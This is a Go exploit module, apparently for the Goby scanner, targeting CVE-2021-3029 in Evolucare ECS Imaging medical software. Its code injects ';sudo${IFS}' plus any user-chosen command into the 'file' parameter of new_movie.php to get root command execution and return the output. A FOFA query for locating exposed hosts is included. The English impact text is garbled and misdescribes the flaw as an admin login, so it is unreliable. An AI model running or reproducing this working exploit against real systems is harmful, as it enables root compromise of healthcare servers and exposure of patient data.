package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Evolucare Ecs imaging new_movie.php file RCE (CVE-2021-3029)",
    "Description": "<p>Storage • Sharing • Viewing Storage Medical images and videos Multimedia files for all specialisms EVOLUCARE Medical Imaging is a division of Evolucare Technologies Group, editing software for the world of healthcare since 1996. Secure web access and teleradiology Remote access to results EVOLUCARE Medical Imaging sells modular, evolving, secure solutions that have been developed around the latest web technologies.</p><p>An attacker can use this vulnerability to log in to the background of the system and obtain administrator privileges, which clearly and detailedly present the application management situation.</p>",
    "Impact": "<p>An attacker can use this vulnerability to log in to the background of the system and obtain administrator privileges, which clearly and detailedly present the application management situation.</p>",
    "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://pdf.medicalexpo.com\">https://pdf.medicalexpo.com</a></p>",
    "Product": "Evolucare Ecs imaging",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Evolucare Ecs imaging new_movie.php 文件命令执行漏洞（CVE-2021-3029）",
            "Product": "Evolucare Ecs imaging",
            "Description": "<p>Evolucare Ecs imaging是一款存储、共享、查看医疗图像及视频相关多媒体文件的医疗保健领域编辑软件。</p><p>Evolucare Ecs imaging存在命令执行漏洞。攻击者可利用该漏执行root权限的任意代码。</p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://pdf.medicalexpo.com\">https://pdf.medicalexpo.com</a></p>",
            "Impact": "<p>Evolucare Ecs imaging存在命令执行漏洞。攻击者可利用该漏执行root权限的任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Evolucare Ecs imaging new_movie.php file RCE (CVE-2021-3029)",
            "Product": "Evolucare Ecs imaging",
            "Description": "<p>Storage • Sharing • Viewing Storage Medical images and videos Multimedia files for all specialisms EVOLUCARE Medical Imaging is a division of Evolucare Technologies Group, editing software for the world of healthcare since 1996. Secure web access and teleradiology Remote access to results EVOLUCARE Medical Imaging sells modular, evolving, secure solutions that have been developed around the latest web technologies.</p><p>An attacker can use this vulnerability to log in to the background of the system and obtain administrator privileges, which clearly and detailedly present the application management situation.</p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://pdf.medicalexpo.com\">https://pdf.medicalexpo.com</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">An attacker can use this vulnerability to log in to the background of the system and obtain administrator privileges, which clearly and detailedly present the application management situation.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"ECSimaging\"",
    "GobyQuery": "body=\"ECSimaging\"",
    "Author": "AnMing",
    "Homepage": "https://pdf.medicalexpo.com/pdf/evolucare/ecs-imaging/77948-133886.html",
    "DisclosureDate": "2022-03-01",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5504",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-3029"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-3029"
    ],
    "CNVD": [
        "CNVD-2021-73655"
    ],
    "CNNVD": [
        "CNNVD-202101-409"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10259"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/new_movie.php?studyUID=1&start=2&end=2&file=1;sudo${IFS}id"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", u.IP)
			cfg.Header.Store("Accept-Language", " zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-Site", "none")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				reg := regexp.MustCompile(`root(.*?)`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) != 0 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			url := "/new_movie.php?studyUID=1&start=2&end=2&file=1;sudo${IFS}"
			url = strings.Replace(url+cmd, " ", "${IFS}", -1)
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Host", expResult.HostInfo.IP)
			cfg.Header.Store("Accept-Language", " zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Sec-Fetch-Dest", "document")
			cfg.Header.Store("Sec-Fetch-Mode", "navigate")
			cfg.Header.Store("Sec-Fetch-Site", "none")
			cfg.Header.Store("Sec-Fetch-User", "?1")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				reg := regexp.MustCompile(`sudo(.*?)`)
				result := reg.FindStringSubmatch(resp.Utf8Html)
				if len(result) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
